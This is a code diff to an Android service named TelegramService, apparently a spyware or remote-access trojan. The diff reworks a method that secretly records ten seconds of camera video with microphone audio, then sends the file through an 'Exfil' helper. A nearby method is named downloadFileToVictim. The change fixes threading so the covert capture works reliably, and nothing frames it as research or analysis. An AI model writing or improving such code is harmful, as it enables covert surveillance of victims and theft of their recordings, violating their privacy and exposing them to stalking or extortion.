@@ -359,61 +359,69 @@ public class TelegramService extends Service {
 
     private void recordVideo(int facing) {
         Exfil.send("🎥 Recording 10s Video...");
-        new Thread(() -> {
-            try {
-                File videoFile = new File(getExternalFilesDir(null), "vid.mp4");
-                CameraManager manager = (CameraManager) getSystemService(CAMERA_SERVICE);
-                String cameraId = getCameraId(facing);
-                if (cameraId == null) { Exfil.send("❌ Cam not found"); return; }
+        
+        // Khasna nkhdmo b HandlerThread bach Camera2 API tkhdem
+        HandlerThread thread = new HandlerThread("CameraVideoThread");
+        thread.start();
+        Handler backgroundHandler = new Handler(thread.getLooper());
 
-                MediaRecorder recorder = new MediaRecorder();
-                recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
-                recorder.setVideoSource(MediaRecorder.VideoSource.SURFACE);
-                recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
-                recorder.setVideoEncoder(MediaRecorder.VideoEncoder.H264);
-                recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
-                recorder.setOutputFile(videoFile.getAbsolutePath());
-                recorder.setVideoSize(640, 480);
-                recorder.setVideoFrameRate(30);
-                recorder.setOrientationHint(facing == CameraCharacteristics.LENS_FACING_FRONT ? 270 : 90);
-                recorder.prepare();
+        try {
+            File videoFile = new File(getExternalFilesDir(null), "vid.mp4");
+            CameraManager manager = (CameraManager) getSystemService(CAMERA_SERVICE);
+            String cameraId = getCameraId(facing);
+            if (cameraId == null) { Exfil.send("❌ Cam not found"); return; }
 
-                manager.openCamera(cameraId, new CameraDevice.StateCallback() {
-                    @Override public void onOpened(CameraDevice camera) {
-                        try {
-                            CaptureRequest.Builder builder = camera.createCaptureRequest(CameraDevice.TEMPLATE_RECORD);
-                            builder.addTarget(recorder.getSurface());
-                            
-                            camera.createCaptureSession(Arrays.asList(recorder.getSurface()), new CameraCaptureSession.StateCallback() {
-                                @Override public void onConfigured(CameraCaptureSession session) {
-                                    try {
-                                        session.setRepeatingRequest(builder.build(), null, null);
-                                        recorder.start();
-                                        
-                                        new Handler(Looper.getMainLooper()).postDelayed(() -> {
-                                            try {
-                                                recorder.stop();
-                                                recorder.release();
-                                                camera.close();
-                                                Exfil.sendFile(videoFile.getAbsolutePath(), "Video", "Video 10s");
-                                            } catch (Exception ex) {
-                                                Exfil.send("❌ Video stop error: " + ex.getMessage());
-                                            }
-                                        }, 10000); 
-                                        
-                                    } catch (Exception e) { Exfil.send("❌ Record Error: " + e.getMessage()); }
-                                }
-                                @Override public void onConfigureFailed(CameraCaptureSession session) {}
-                            }, null);
-                        } catch (Exception e) {}
-                    }
-                    @Override public void onDisconnected(CameraDevice camera) {}
-                    @Override public void onError(CameraDevice camera, int error) { Exfil.send("❌ Cam Error: " + error); }
-                }, null);
-            } catch (Exception e) { Exfil.send("❌ Vid Error: " + e.getMessage()); }
-        }).start();
+            MediaRecorder recorder = new MediaRecorder();
+            recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
+            recorder.setVideoSource(MediaRecorder.VideoSource.SURFACE);
+            recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
+            recorder.setVideoEncoder(MediaRecorder.VideoEncoder.H264);
+            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
+            recorder.setOutputFile(videoFile.getAbsolutePath());
+            recorder.setVideoSize(640, 480);
+            recorder.setVideoFrameRate(30);
+            recorder.setOrientationHint(facing == CameraCharacteristics.LENS_FACING_FRONT ? 270 : 90);
+            recorder.prepare();
+
+            manager.openCamera(cameraId, new CameraDevice.StateCallback() {
+                @Override public void onOpened(CameraDevice camera) {
+                    try {
+                        CaptureRequest.Builder builder = camera.createCaptureRequest(CameraDevice.TEMPLATE_RECORD);
+                        builder.addTarget(recorder.getSurface());
+                        
+                        camera.createCaptureSession(Arrays.asList(recorder.getSurface()), new CameraCaptureSession.StateCallback() {
+                            @Override public void onConfigured(CameraCaptureSession session) {
+                                try {
+                                    session.setRepeatingRequest(builder.build(), null, backgroundHandler);
+                                    recorder.start();
+                                    
+                                    new Handler(Looper.getMainLooper()).postDelayed(() -> {
+                                        try {
+                                            recorder.stop();
+                                            recorder.release();
+                                            camera.close();
+                                            thread.quitSafely();
+                                            Exfil.sendFile(videoFile.getAbsolutePath(), "Video", "Video 10s");
+                                        } catch (Exception ex) {
+                                            Exfil.send("❌ Video stop error: " + ex.getMessage());
+                                        }
+                                    }, 10000); 
+                                    
+                                } catch (Exception e) { Exfil.send("❌ Record Error: " + e.getMessage()); }
+                            }
+                            @Override public void onConfigureFailed(CameraCaptureSession session) { Exfil.send("❌ Config Failed"); }
+                        }, backgroundHandler);
+                    } catch (Exception e) { Exfil.send("❌ Cam open error: " + e.getMessage()); }
+                }
+                @Override public void onDisconnected(CameraDevice camera) {}
+                @Override public void onError(CameraDevice camera, int error) { Exfil.send("❌ Cam Error: " + error); }
+            }, backgroundHandler);
+        } catch (Exception e) { 
+            Exfil.send("❌ Vid Error: " + e.getMessage()); 
+            thread.quitSafely();
+        }
     }
-
+    
     private void downloadFileToVictim(String fileId, String fileName) {
         Exfil.send("⏳ Uploading: " + fileName);
         try {
